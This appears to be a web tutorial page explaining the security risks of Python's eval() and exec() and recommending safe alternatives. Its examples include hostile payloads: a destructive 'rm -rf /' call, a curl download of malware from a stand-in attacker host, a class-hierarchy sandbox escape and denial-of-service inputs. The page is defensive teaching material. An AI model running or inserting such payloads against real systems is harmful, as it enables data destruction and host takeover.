@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Python eval and exec Security Risks - python</title>
+    <meta name="description" content="Python's eval() and exec() functions dynamically parse and execute strings as Python code, creating severe security vulnerabilities when exposed to untrusted input. Running user-supplied strings through these functions allows malicious actors to exploit">
+    <link rel="canonical" href="https://salivity.github.io/python/article/python-eval-and-exec-security-risks">
+    <link rel="search" type="application/opensearchdescription+xml" title="python" href="/python/opensearch.xml">
+    <link rel="icon" href="/python/favicon.ico">
+    <link rel="stylesheet" href="/python/css/style.css">
+    <link media="print" rel="stylesheet" href="/python/css/print.css">
+    <script src="/python/js/fuse.min.js"></script>
+    <script src="/python/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Python eval and exec Security Risks - python" />
+    <meta property="og:url" content="https://salivity.github.io/python/article/python-eval-and-exec-security-risks" />
+    <meta property="og:image" content="https://salivity.github.io/python/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/python/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Python's eval() and exec() functions dynamically parse and execute strings as Python code, creating severe security vulnerabilities when exposed to untrusted input. Running user-supplied strings through these functions allows malicious actors to exploit" />
+    <link rel="manifest" href="/python/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/python/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>python</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/python/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        
+    <div class="article-layout">
+        <aside id="profile-sidebar" class="profile-column" aria-label="Author Profile"></aside>
+        <div class="article-main-column">
+            <article><h1 id="python-eval-and-exec-security-risks">Python eval and exec
+Security Risks</h1>
+<p>Python's <code>eval()</code> and <code>exec()</code> functions
+dynamically parse and execute strings as Python code, creating severe
+security vulnerabilities when exposed to untrusted input. Running
+user-supplied strings through these functions allows malicious actors to
+exploit the Python runtime, potentially leading to Remote Code Execution
+(RCE), full system compromise, sensitive data exfiltration, and denial
+of service. This article breaks down the specific security risks
+associated with <code>eval()</code> and <code>exec()</code>,
+demonstrates how attackers bypass naive restrictions, and presents
+secure alternatives.</p>
+<h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2>
+<p>The most critical danger of <code>eval()</code> and
+<code>exec()</code> is arbitrary code execution. Because these functions
+run arbitrary code with the same permissions as the hosting Python
+process, an attacker who can inject input into these functions
+effectively controls the application.</p>
+<p>Using standard library modules, an attacker can interact directly
+with the underlying operating system:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Malicious payload passed to eval() or exec()</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="bu">__import__</span>(<span class="st">&#39;os&#39;</span>).system(<span class="st">&#39;rm -rf /&#39;</span>)</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="bu">__import__</span>(<span class="st">&#39;subprocess&#39;</span>).run([<span class="st">&#39;curl&#39;</span>, <span class="st">&#39;https://attacker.com/malware&#39;</span>, <span class="st">&#39;-o&#39;</span>, <span class="st">&#39;malware.sh&#39;</span>])</span></code></pre></div>
+<p>Through these commands, an attacker can modify files, download
+malicious scripts, spawn reverse shells, or seize complete control of
+the host machine or container.</p>
+<h2 id="sandbox-escapes-and-built-in-traversal">Sandbox Escapes and
+Built-in Traversal</h2>
+<p>Developers often attempt to secure <code>eval()</code> by sanitizing
+inputs or restricting the global namespace, such as executing code with
+empty globals:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="bu">eval</span>(user_input, {<span class="st">&quot;__builtins__&quot;</span>: {}})</span></code></pre></div>
+<p>This approach provides a false sense of security. Python's object
+model allows an attacker to navigate the class hierarchy and recover
+restricted modules or built-in functions via reflection. For
+example:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Traversing object subclasses to regain access to os.system or open</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>[c <span class="cf">for</span> c <span class="kw">in</span> ().<span class="va">__class__</span>.__bases__[<span class="dv">0</span>].__subclasses__() <span class="cf">if</span> c.<span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;BuiltinImporter&#39;</span>][<span class="dv">0</span>]().load_module(<span class="st">&#39;os&#39;</span>).system(<span class="st">&#39;id&#39;</span>)</span></code></pre></div>
+<p>Because Python exposes its internal types and object relationships,
+creating an airtight sandbox using solely language-level restrictions is
+exceptionally difficult and routinely bypassed.</p>
+<h2 id="data-exfiltration-and-memory-exposure">Data Exfiltration and
+Memory Exposure</h2>
+<p>When code executes inside <code>eval()</code> or <code>exec()</code>,
+it shares the scope in which it is invoked unless explicitly isolated.
+An attacker can inspect local and global variables to access sensitive
+runtime data:</p>
+<ul>
+<li><strong>Environment Variables:</strong> API keys, database
+credentials, and secret signing keys often reside in
+<code>os.environ</code>.</li>
+<li><strong>Application State:</strong> In-memory session tokens,
+customer data, and database connections can be intercepted and
+transmitted to external servers.</li>
+</ul>
+<p>Even when stdout is suppressed, attackers can exfiltrate stolen data
+through out-of-band channels, such as automated HTTP requests or DNS
+lookups.</p>
+<h2 id="denial-of-service-dos">Denial of Service (DoS)</h2>
+<p>Malicious inputs do not need to access the shell to cause damage. An
+attacker can inject instructions that consume excessive CPU or memory
+resources, crashing the Python process or rendering the entire server
+unresponsive.</p>
+<p>Common DoS vectors include:</p>
+<ul>
+<li><strong>Infinite Loops:</strong> Inputs like
+<code>while True: pass</code> tie up the CPU thread indefinitely.</li>
+<li><strong>Memory Exhaustion:</strong> Expressions like
+<code>'A' * (10**9)</code> attempt massive memory allocations,
+triggering out-of-memory (OOM) errors that terminate the process.</li>
+<li><strong>Process Termination:</strong> Commands like
+<code>exit()</code> or <code>quit()</code> can shut down the application
+instance immediately.</li>
+</ul>
+<h2 id="safe-alternatives">Safe Alternatives</h2>
+<p>To eliminate the risks of <code>eval()</code> and
+<code>exec()</code>, replace dynamic execution with purpose-built
+parsers and serializers:</p>
+<ol type="1">
+<li><strong><code>ast.literal_eval()</code></strong>: If you only need
+to parse Python literals (strings, numbers, tuples, lists, dicts,
+booleans, and <code>None</code>), use <code>ast.literal_eval()</code>.
+It rejects expressions containing operators, variable assignments, and
+function calls.</li>
+<li><strong>Structured Formats</strong>: Use standard serialization
+formats like JSON, YAML, or Protocol Buffers to transfer structured data
+safely.</li>
+<li><strong>Domain-Specific Parsers</strong>: If dynamic mathematical
+expressions must be evaluated, implement a parser using libraries such
+as <code>pyparsing</code> or abstract syntax tree (AST) visitors that
+explicitly whitelist allowed operators and reject function calls
+entirely.</li>
+</ol></article>
+        <div id="comments-container"></div>
+        <script>
+            const utterancesScript = document.createElement('script');
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/python'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+        </div>
+    </div>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/python/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/python/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
